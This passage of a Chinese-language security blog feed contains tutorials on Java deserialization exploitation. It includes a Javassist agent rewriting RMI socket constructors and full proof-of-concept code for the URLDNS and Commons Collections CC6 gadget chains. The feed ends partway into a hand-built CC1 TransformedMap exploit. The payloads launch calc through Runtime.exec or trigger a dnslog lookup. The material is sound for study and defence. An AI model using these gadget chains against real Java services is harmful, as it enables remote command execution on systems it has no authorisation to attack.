class="hljs-string">&quot;java.rmi.server.RMIClientSocketFactory&quot;</span>),pool.get(<span class="hljs-string">&quot;java.rmi.server.RMIServerSocketFactory&quot;</span>)&#125;);<br>                System.out.println(<span class="hljs-string">&quot;aaa&quot;</span>);<br>                constructor.setBody(<span class="hljs-string">&quot;&#123;listenPort = -1;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        transport = null;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        if ($1 == callbackip) &#123;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;            $1 = $1;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        &#125; else if ($1 ==null) &#123;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;            $1 = \&quot;\&quot;;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        &#125; else &#123;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;            $1 = this.targetip;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        &#125;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        host =$1;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        port = $2;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        csf = $3;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        ssf = $4;&#125;&quot;</span>);<br>                System.out.println(<span class="hljs-string">&quot;BBB&quot;</span>);<br>                <span class="hljs-comment">// 将修改后的字节码保存到文件或应用程序中</span><br>                ctClass.writeFile();<br>                <span class="hljs-keyword">return</span> ctClass.toBytecode();<br><br><br>            &#125; <span class="hljs-keyword">catch</span> (NotFoundException | IOException | CannotCompileException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br><br><br>        &#125;<br>        <span class="hljs-keyword">return</span> classfileBuffer;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>MANIFEST.MF：</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">Manifest-Version: <span class="hljs-number">1.0</span><br>Can-Redefine-Classes: <span class="hljs-keyword">true</span><br>Can-Retransform-Classes: <span class="hljs-keyword">true</span><br>Can-<span class="hljs-keyword">Set</span>-Native-<span class="hljs-keyword">Method</span>-<span class="hljs-title function_">Prefix</span>: <span class="hljs-keyword">true</span><br>Premain-<span class="hljs-keyword">Class</span>: Agent.Mainagent<br><br></code></pre></td></tr></table></figure><h2 id="埋坑"><a href="#埋坑" class="headerlink" title="埋坑"></a>埋坑</h2><p><img src="https://i.mji.rip/2023/09/28/6664fa9feb87b8877cdb35fe9317f471.png" alt="image-20230928172819145"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>最好用的两条链</title>
    <link href="/2023/09/11/%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E4%B8%A4%E6%9D%A1%E9%93%BE/"/>
    <url>/2023/09/11/%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E4%B8%A4%E6%9D%A1%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p>为什么说这URLDNS和CC6两条链比较常用呢？</p><p>这是因为其他链条在高版本的jdk没法利用或者是利用条件很苛刻，或者还有一些依赖上的限制。总的来说这是比较好用的两条链。</p><p>下面我们简单看看这两条链。这里不会像之前CC1那样一步一步分析，主要还是像体现一些细节。</p><h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><p>在URLDNS里，其实真正能发起DNS请求的就两个函数一个<code>hashcode</code>，一个<code>equals</code>。</p><h2 id="调用链："><a href="#调用链：" class="headerlink" title="调用链："></a>调用链：</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    *<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-constructor">Val()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URL</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URLStreamHandler</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URLStreamHandler</span>.</span></span>get<span class="hljs-constructor">HostAddress()</span><br><br></code></pre></td></tr></table></figure><p>带上图（图的顺序是按链条的反方向）</p><h2 id="图流程分析："><a href="#图流程分析：" class="headerlink" title="图流程分析："></a>图流程分析：</h2><p><img src="https://ice.frostsky.com/2023/09/11/b9874ac967e2641313c586ec00083c49.png" alt="image-20230911182016088"></p><p><img src="https://ice.frostsky.com/2023/09/11/d2519a3e22cec5f3b293002b88408e67.png" alt="image-20230911182252319"></p><p><img src="https://ice.frostsky.com/2023/09/11/764040f1f4ba3efe16c4825dd73b5a4c.png" alt="image-20230911182415368"></p><p><img src="https://ice.frostsky.com/2023/09/11/cced5b7f9e6684446bf8af09cbc04126.png" alt="image-20230911182508305"></p><p>关键字key都已经出现了，这个也比较简单，后面就不看了。</p><h2 id="利用构造："><a href="#利用构造：" class="headerlink" title="利用构造："></a>利用构造：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//初始化Map</span><br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;Object,Object&gt;();<br>        <span class="hljs-comment">//创建url对象</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://yuanyi.dnslog&quot;</span>);<br>        <span class="hljs-comment">//因为要修改URL中的hashCode，避免在put的时候就发出dnslog请求。</span><br>        <span class="hljs-comment">//获取URL的Class对象</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">urlClass</span> <span class="hljs-operator">=</span> url.getClass();<br>        <span class="hljs-comment">//获取被保护的hashCode</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashCode</span> <span class="hljs-operator">=</span> urlClass.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        <span class="hljs-comment">//设置为可访问</span><br>        hashCode.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//将url的hashCode设置为666</span><br>        hashCode.set(url,<span class="hljs-number">666</span>);<br>        <span class="hljs-comment">//将hashcode为666的url放入，因为不等于-1所以不会执行key.hashcode()</span><br>        map.put(url,<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">//将url的hashCode设置为-1。为后续反序列化调用key.hashcode()做铺垫</span><br>        hashCode.set(url,-<span class="hljs-number">1</span>);<br><br>        serialize(map);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h1><h2 id="调用链：-1"><a href="#调用链：-1" class="headerlink" title="调用链："></a>调用链：</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashSet</span>.</span></span>read<span class="hljs-constructor">Object()</span>/<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><p>两个入口点，我们直接选择<code>HashMap.readObject()</code>作为入口点。</p><p>带上图（图的顺序是按链条的反方向）</p><h2 id="图流程分析：-1"><a href="#图流程分析：-1" class="headerlink" title="图流程分析："></a>图流程分析：</h2><p><img src="https://ice.frostsky.com/2023/09/11/b209253607026548bc018894096fd3cd.png" alt="image-20230911164838948"></p><p><img src="https://ice.frostsky.com/2023/09/11/c40d690cdf8bbbf84064d9650eec2304.png" alt="image-20230911165639391"></p><p><img src="https://ice.frostsky.com/2023/09/11/28b3a631ad6a62098df83c68bada4ab7.png" alt="image-20230911170222137"></p><p><img src="https://ice.frostsky.com/2023/09/11/fee6d0251c5200c75d2e972e99a1722c.png" alt="image-20230911170423536"></p><p><img src="https://ice.frostsky.com/2023/09/11/c04381d1726028b240f8a5e4ef99a1cd.png" alt="image-20230911170829704"></p><p><img src="https://ice.frostsky.com/2023/09/11/3166f36cdaf53479203e62c099a43ab0.png" alt="image-20230911171508642"></p><p><img src="https://ice.frostsky.com/2023/09/11/8d8dc7e6b2788e277dee9b5a12b77140.png" alt="image-20230911171107380"></p><p><img src="https://ice.frostsky.com/2023/09/11/de7196997bbe166ce987cb5d6ff173b6.png" alt="image-20230911171647154"></p><h2 id="利用构造：-1"><a href="#利用构造：-1" class="headerlink" title="利用构造："></a>利用构造：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6_test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, NoSuchFieldException, IOException &#123;<br>        <span class="hljs-comment">//这个跟CC1一样，不会的小伙伴可以看我之前CC1的文章。</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>        &#125;;<br>        <span class="hljs-comment">/*这里之所以先创建一个假的(没有数据的)chainedTransformer是因为</span><br><span class="hljs-comment">        如果我们直接将真的(带有数据的)chainedTransformer放入LazyMap中再到TiedMapEntry</span><br><span class="hljs-comment">        那么在后续序列化的时候会调用到TiedMapEntry.hashCode，那么再反序列化就不会再执行了</span><br><span class="hljs-comment">        跟URLDNS要修改hashcode其实是一个道理*/</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">fake_chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;&#125;);<br>        <span class="hljs-comment">//初始化MAP</span><br>        HashMap&lt;Object, Object&gt; map1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-comment">//创建LazyMap，并引入到TiedMapEntry</span><br>        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map, fake_chainedTransformer);<br>        Map.<span class="hljs-type">Entry</span>  <span class="hljs-variable">mapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, Runtime.class);<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(mapEntry,<span class="hljs-string">&quot;adad&quot;</span>);<br>        <br>        <span class="hljs-comment">//利用反射再把ChainedTransformer中的Transformers改回真的。</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(fake_chainedTransformer,transformers);<br>        <span class="hljs-comment">//清空由于 hashmap 对 LazyMap 造成的影响</span><br>        lazymap.clear();<br><br>        serialize(map2);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>通俗易懂的CC1之手搓EXP</title>
    <link href="/2023/08/30/Java-CC1/"/>
    <url>/2023/08/30/Java-CC1/</url>
    
    <content type="html"><![CDATA[<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">每篇毒鸡汤<br>    滴水石穿<br>                ——瞎编的<br></code></pre></td></tr></table></figure><p>前言：</p><p>学java反序列化，怎么能少了对每条链的理解呢？本篇我们主要是选择CC1中的其中一条链<code>TransformedMap</code>进行手搓EXP，希望各位同学带好手套，小心你的小手磨出茧子。</p><p>CC1链其实是Java反序列化中最重要的一条，大家一定要认真理解吃透，这样剩下的链学起来就会非常轻松。而CC1一共是有两条：一条是<code>Lazymap</code>,一条是<code>TransformedMap</code>，我们先来看看<code>TransformedMap</code>这一条：</p><p><img src="https://ice.frostsky.com/2023/08/30/2daabec5cca1d6432f29bd5966826827.png" alt="image-20230830150305811"></p><p>整个漏洞的触发点就是在这里，可以看到在InvokerTransformer.<code>transform</code>中可以利用反射调用任意方法。而其中的参数<code>iMethodName</code>、 <code>iParamTypes</code>、<code>iArgs</code>都是变量，是通过InvokerTransformer的构造方法传入的。很大可能是我们可以直接控制的。</p><p>然后我们可以利用这个点来进行反射调用Runtime中的exec从而进行命令执行。很明显这里是利用反射来进行调用的。那我们先简单的写一个正常的利用反射来调用Runtime：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//获取Runtime的class</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;<br><span class="hljs-comment">//获取getRuntime方法</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">getRuntime</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br><span class="hljs-comment">//获取Runtime对象</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> (Runtime) getRuntime.invoke(<span class="hljs-literal">null</span>);<br><span class="hljs-comment">//获取exec方法</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br><span class="hljs-comment">//调用exec方法</span><br>exec.invoke(runtime,<span class="hljs-string">&quot;calc&quot;</span>);<br><br><span class="hljs-comment">/*  Java反射如果不清楚的同学可以先去学习一下Java反射然后再来学习，要不然从头懵到尾，看了等于没看。  </span><br><span class="hljs-comment">    还有因为我们最终的目的是将数据反序列化，这里的命令执行时我们要反序列化触发的点，所以我们需要找一个可以反序列化的类，而Runtime对象本身时不支持反序列化的，所以我们找到了Runtime的class</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>我们利用反射调用了Runtime中的exec，这正和我们的链条触发点吻合，那么我们可不可以用漏洞触发点的方式再反射一边：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;方法名&quot;</span>，<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;方法参数类型&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;方法参数&#125;).transform(Object);<br><span class="hljs-comment">//可以看到，我们可以通过实例化InvokerTransformer，将参数传入，再调用他的transform方法并给transform传入对应的对象。</span><br><span class="hljs-comment">//下面我将上面写的反射注释掉，并把他们对应的触发点利用方式附上。</span><br><br><br><br><br><br> <span class="hljs-comment">//     Class c = Runtime.class;</span><br> <span class="hljs-comment">//     Method getRuntime = c.getMethod(&quot;getRuntime&quot;);</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntime</span> <span class="hljs-operator">=</span> (Method) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;).transform(Runtime.class);<br><br><br> <span class="hljs-comment">//     Object runtime = (Runtime) getRuntime.invoke(null);</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;).transform(getRuntime);<br><br><br> <span class="hljs-comment">//     Method exec = c.getMethod(&quot;exec&quot;, String.class);</span><br> <span class="hljs-comment">//     exec.invoke(runtime,&quot;calc&quot;);</span><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(runtime);<br><span class="hljs-comment">//重点记住最后一个，因为最后一个是直接触发RCE的代码，后续我们也会用到</span><br></code></pre></td></tr></table></figure><p>我们很简单的就将对应的触发点反射写了出来，那光写出来不行啊，怎么用呢？我们接着看谁调用了<code>InvokerTransformer</code>中的<code>transform</code>：</p><p><img src="https://ice.frostsky.com/2023/08/30/a97f11a06a313cd1ef6f78a91c2f2f58.md.png" alt="image-20230830153422540"></p><p>可以看到这里有很多，我们选择<code>TransformedMap</code>中的<code>checkSetValue</code>调用了<code>InvokerTransformer</code>中的<code>transform</code>，我们先看看<code>checkSetValue</code>中的参数分别是什么，来到<code>TransformedMap</code>的构造方法：</p><p><img src="https://ice.frostsky.com/2023/08/30/6f6c5fd3d232559e0fa18e974df7bf41.png" alt="image-20230830153914097"></p><p>这里其实是实现装饰HashMap的，但是他的构造方法是protected，也就是说我们没有办法直接调用，只能是通过他内部调用。他的功能就是接收一个map进来，对他的key和value进行一些操作。我们看到<code>checkSetValue</code>中的<code>valueTransforme</code>就是通过这个构造方法传入的。</p><p>那么好，我们再看看谁调用了这个<code>TransformedMap</code>,最后发现再<code>TransformedMap</code>中还有一个静态方法<code>decorate</code>调用了<code>TransformedMap</code>：</p><p><img src="https://ice.frostsky.com/2023/08/30/b3007e66e3b16a96bf9e0435870ac7ff.png" alt="image-20230830154730095"></p><p>那么我们直接从这里开始结合之前写的<code>InvokerTransformer</code>调用exec来先写一下利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">........此处省略为上面的反射代码。<br><span class="hljs-comment">//利用InvokerTransformer中的transform调用命令执行</span><br><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(runtime);<br><span class="hljs-comment">//创建一个HashMap</span><br>HashMap&lt;Object, Object&gt; HM = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><span class="hljs-comment">//添加到Map中</span><br>HM.put(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-comment">//调用装饰map       </span><br>Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(HM, <span class="hljs-literal">null</span>, invokerTransformer);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">解释：</span><br><span class="hljs-comment">    